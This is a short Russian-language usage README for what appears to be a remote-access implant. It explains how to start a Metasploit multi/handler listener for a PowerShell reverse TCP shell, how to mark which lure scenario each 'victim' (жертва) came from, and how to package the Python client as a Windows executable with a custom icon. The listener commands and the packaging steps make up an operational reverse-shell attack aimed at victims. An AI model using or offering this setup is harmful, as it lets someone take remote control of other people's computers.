# Использование

1. Запустить листенер msfconsole

```bash
use multi/handler
set payload cmd/windows/powershell_reverse_tcp
set LHOST <IP>
set LPORT 4443
set ExitOnSession false
exploit -j
```

2. Скрипт client.py 

Так как исполняемый файл может использоваться в нескольких сценариях, то нужно различать из какого именно сценария пришла жертва.

Например, для каждого сценария можно указать в переменной `currentWD` разное количество символов `>`

3. Конвертация

Конвертируем из формата `py` в формат `exe` с помощью py2exe.
Чтобы исполняемый файл работал на Windows 7 и на Windows 10, конвертирование производить на ОС Windows 7.
Иконка обязательно формата `.ico`

```bash
python setup.py install
```